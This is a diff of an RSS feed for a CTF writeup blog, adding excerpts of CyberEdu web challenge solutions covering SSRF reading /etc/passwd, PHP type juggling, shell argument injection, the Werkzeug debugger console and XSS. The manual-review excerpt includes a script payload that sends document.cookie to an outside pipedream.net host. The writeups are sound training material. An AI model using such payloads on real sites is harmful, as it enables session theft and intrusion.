@@ -6,8 +6,91 @@
     <description>Recent content in Web on Irina&#39;s CTF Writeups</description>
     <generator>Hugo -- 0.146.0</generator>
     <language>en-us</language>
-    <lastBuildDate>Mon, 12 Jan 2026 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Mon, 26 Jan 2026 00:00:00 +0000</lastBuildDate>
     <atom:link href="https://irinasusca.github.io/writeup-blog/tags/web/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>CyberEdu ultra-crawl Writeup</title>
+      <link>https://irinasusca.github.io/writeup-blog/posts/ultracrawl-writeup/</link>
+      <pubDate>Mon, 26 Jan 2026 00:00:00 +0000</pubDate>
+      <guid>https://irinasusca.github.io/writeup-blog/posts/ultracrawl-writeup/</guid>
+      <description>&lt;h2 id=&#34;challenge-overview&#34;&gt;Challenge overview&lt;/h2&gt;
+&lt;p&gt;Here is your favorite proxy for crawling minimal websites.&lt;/p&gt;
+&lt;h2 id=&#34;identifying-the-vulnerabilities&#34;&gt;Identifying the vulnerabilities&lt;/h2&gt;
+&lt;p&gt;This looks like some sort of crawler that mirrors the given page&amp;rsquo;s response. After a pipedream webhook, looks like they&amp;rsquo;re using &lt;code&gt;Python-urllib/3.6&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Some classic SSRF, we can just feed this crawler a &lt;code&gt;file:///etc/passwd&lt;/code&gt; and surprise, it works!&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;challenge-screenshot&#34; loading=&#34;lazy&#34; src=&#34;https://irinasusca.github.io/writeup-blog/posts/ultracrawl-writeup/etc.png#center&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Now we just need to figure our where our flag is - if we input a wrong file location, we get a 500. From /etc/passwd, looks like we have a /home/ctf user, so let&amp;rsquo;s look for the flag there.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>CyberEdu the-code Writeup</title>
+      <link>https://irinasusca.github.io/writeup-blog/posts/thecode-writeup/</link>
+      <pubDate>Sun, 25 Jan 2026 00:00:00 +0000</pubDate>
+      <guid>https://irinasusca.github.io/writeup-blog/posts/thecode-writeup/</guid>
+      <description>&lt;h2 id=&#34;challenge-overview&#34;&gt;Challenge overview&lt;/h2&gt;
+&lt;p&gt;Look, the code is there. Enjoy.&lt;/p&gt;
+&lt;h2 id=&#34;identifying-the-vulnerabilities&#34;&gt;Identifying the vulnerabilities&lt;/h2&gt;
+&lt;p&gt;More php fun.&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;challenge-screenshot&#34; loading=&#34;lazy&#34; src=&#34;https://irinasusca.github.io/writeup-blog/posts/thecode-writeup/src.png#center&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We have two arguments here, &lt;code&gt;start&lt;/code&gt; (actually start the challenge) and &lt;code&gt;arg&lt;/code&gt;. Then, after blacklisting the following in &lt;code&gt;arg&lt;/code&gt;: &lt;code&gt;php &amp;gt; &amp;amp; $ :&lt;/code&gt;, they execute &lt;code&gt;shell_exec(&amp;quot;find /tmp -iname &amp;quot;.escapeshellcmd($_GET[&#39;arg&#39;]))&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;That means they return the &lt;code&gt;toupper&lt;/code&gt; version of what that command returns, which is b64 encoded, and more exactly the result of the files that are named like &lt;code&gt;arg&lt;/code&gt; in /tmp.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>CyberEdu puzzled Writeup</title>
+      <link>https://irinasusca.github.io/writeup-blog/posts/puzzled-writeup/</link>
+      <pubDate>Sun, 18 Jan 2026 00:00:00 +0000</pubDate>
+      <guid>https://irinasusca.github.io/writeup-blog/posts/puzzled-writeup/</guid>
+      <description>&lt;h2 id=&#34;challenge-overview&#34;&gt;Challenge overview&lt;/h2&gt;
+&lt;p&gt;How puzzled can you get with php?&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;I really didn&amp;rsquo;t feel like doing php challenges but I did it anyways.&lt;/p&gt;
+&lt;h2 id=&#34;identifying-the-vulnerabilities&#34;&gt;Identifying the vulnerabilities&lt;/h2&gt;
+&lt;p&gt;We get a &lt;code&gt;php&lt;/code&gt; source file with what looks like login. If we don&amp;rsquo;t provide a pass, the source gets leaked.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pass&amp;#39;&lt;/span&gt;])){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    $pass &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;generateRandomString&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    $user_input &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;json_decode&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pass&amp;#39;&lt;/span&gt;]);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ($pass &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; $user_input&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pass&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;HTTP/1.0 403 Forbidden&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;They generate a random 95 letter long password, decode the json of our &lt;code&gt;pass&lt;/code&gt;, and hit us with a 403 if the password isn&amp;rsquo;t correct. But the comparison is done with &lt;code&gt;!=&lt;/code&gt;, not &lt;code&gt;!==&lt;/code&gt;. For example, &lt;code&gt;5!=&amp;quot;5&amp;quot;&lt;/code&gt; would return false, while &lt;code&gt;5!==&amp;quot;5&amp;quot;&lt;/code&gt; would return true.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>CyberEdu js-magic Writeup</title>
+      <link>https://irinasusca.github.io/writeup-blog/posts/jsmagic-writeup/</link>
+      <pubDate>Thu, 15 Jan 2026 00:00:00 +0000</pubDate>
+      <guid>https://irinasusca.github.io/writeup-blog/posts/jsmagic-writeup/</guid>
+      <description>&lt;h2 id=&#34;challenge-overview&#34;&gt;Challenge overview&lt;/h2&gt;
+&lt;p&gt;Javascript Obfuscation 101.&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;Already sounds bad, and I just noticed the &lt;em&gt;Cryptography&lt;/em&gt; tag, but let&amp;rsquo;s give it a go. We&amp;rsquo;re only given a &lt;code&gt;chall_clean.js&lt;/code&gt; file, and no instance.&lt;/p&gt;
+&lt;h2 id=&#34;identifying-the-vulnerabilities&#34;&gt;Identifying the vulnerabilities&lt;/h2&gt;
+&lt;p&gt;I tried running it in an online compiler, but it required the &lt;code&gt;window&lt;/code&gt; component, so I locally added an index.html buddy for it and ran them together, and what it did was open a lot of porn tabs.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>CyberEdu rundown Writeup</title>
+      <link>https://irinasusca.github.io/writeup-blog/posts/rundown-writeup/</link>
+      <pubDate>Thu, 15 Jan 2026 00:00:00 +0000</pubDate>
+      <guid>https://irinasusca.github.io/writeup-blog/posts/rundown-writeup/</guid>
+      <description>&lt;h2 id=&#34;challenge-overview&#34;&gt;Challenge overview&lt;/h2&gt;
+&lt;p&gt;A rundown, informally known as a pickle or the hotbox, is a situation in the game of baseball that occurs when the baserunner is stranded between two bases, also known as no-man&amp;rsquo;s land, and is in jeopardy of being tagged out.&amp;quot; &amp;hellip; if you stopped in the first part of the definition you are one of ours.&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;img alt=&#34;challenge-screenshot&#34; loading=&#34;lazy&#34; src=&#34;https://irinasusca.github.io/writeup-blog/posts/rundown-writeup/pin.png#center&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This is &lt;em&gt;EXACTLY&lt;/em&gt; like &lt;a href=&#34;irinasusca.github.io/writeup-blog/slightly-broken&#34;&gt;slightly-broken&lt;/a&gt; (you could take a look at it, it&amp;rsquo;s short), except the &lt;code&gt;pin&lt;/code&gt; things are actually being used!&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>CyberEdu slightly-broken Writeup</title>
+      <link>https://irinasusca.github.io/writeup-blog/posts/slightlybroken-writeup/</link>
+      <pubDate>Tue, 13 Jan 2026 00:00:00 +0000</pubDate>
+      <guid>https://irinasusca.github.io/writeup-blog/posts/slightlybroken-writeup/</guid>
+      <description>&lt;h2 id=&#34;challenge-overview&#34;&gt;Challenge overview&lt;/h2&gt;
+&lt;p&gt;For this one, only contact admins for socialising with them. Do not contact them for errors at this challenge.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;identifying-the-vulnerabilities&#34;&gt;Identifying the vulnerabilities&lt;/h2&gt;
+&lt;p&gt;We bump into some errors, but look at this section of a response:&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;challenge-screenshot&#34; loading=&#34;lazy&#34; src=&#34;https://irinasusca.github.io/writeup-blog/posts/slightlybroken-writeup/hint.png#center&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This is part of the Flask/Werkzeug&amp;rsquo;s interactive debugger, and we see it because of the error.&lt;/p&gt;
+&lt;p&gt;To execute a command, we need the params &lt;code&gt;__debugger__: &#39;yes&#39;, cmd: &#39;pinauth&#39;, pin: pin, s: SECRET&lt;/code&gt; as json. In a &lt;code&gt;GET&lt;/code&gt; request, because Workzeug uses &lt;code&gt;GET&lt;/code&gt;s not &lt;code&gt;POST&lt;/code&gt;.&lt;/p&gt;</description>
+    </item>
     <item>
       <title>CyberEdu downloader-v1 Writeup</title>
       <link>https://irinasusca.github.io/writeup-blog/posts/downloaderv1-writeup/</link>
@@ -18,6 +101,23 @@
 &lt;hr&gt;
 &lt;h2 id=&#34;identifying-the-vulnerabilities&#34;&gt;Identifying the vulnerabilities&lt;/h2&gt;
 &lt;p&gt;In the GET request, we have a comment pointing us to flag.php, and the /file.php contains &amp;ldquo;GET ME&amp;rdquo;. Using gobuster, we find a &lt;code&gt;/uploads/&lt;/code&gt; directory. There&amp;rsquo;s a &lt;code&gt;/uploads/index.html&lt;/code&gt;, but it&amp;rsquo;s empty. I kept trying to find a way to access uploads aimlessly, when I thought, what if I try to send an actual image&amp;rsquo;s link?&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>CyberEdu manual-review Writeup</title>
+      <link>https://irinasusca.github.io/writeup-blog/posts/manualreview-writeup/</link>
+      <pubDate>Mon, 12 Jan 2026 00:00:00 +0000</pubDate>
+      <guid>https://irinasusca.github.io/writeup-blog/posts/manualreview-writeup/</guid>
+      <description>&lt;h2 id=&#34;challenge-overview&#34;&gt;Challenge overview&lt;/h2&gt;
+&lt;p&gt;For any coffe machine issue please open a ticket at the IT support department.&lt;/p&gt;
+&lt;p&gt;Flag format: ctf{sha256}&lt;/p&gt;
+&lt;p&gt;Goal: The web application contains a vulnerability which allows an attacker to leak sensitive information.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;identifying-the-vulnerabilities&#34;&gt;Identifying the vulnerabilities&lt;/h2&gt;
+&lt;p&gt;This look familiar?&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;challenge-screenshot&#34; loading=&#34;lazy&#34; src=&#34;https://irinasusca.github.io/writeup-blog/posts/manualreview-writeup/xss.png#center&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Alright, so XSS is confirmed, and we have two types of cookies.&lt;/p&gt;
+&lt;p&gt;First, the CSRF protection tokens, &lt;code&gt;XSTF-TOKEN&lt;/code&gt;, then the &lt;code&gt;manual_review_session&lt;/code&gt;, which actually stores the current session/user.&lt;/p&gt;
+&lt;p&gt;I sent a  &lt;code&gt;&amp;lt;script&amp;gt; fetch(&#39;https://myprivatelinkwithlimitedrequests.m.pipedream.net/?cookie=&#39; + encodeURIComponent(document.cookie)); &amp;lt;/script&amp;gt;&lt;/code&gt; and look at what we got -&lt;/p&gt;</description>
     </item>
     <item>
       <title>CyberEdu broken-login Writeup</title>
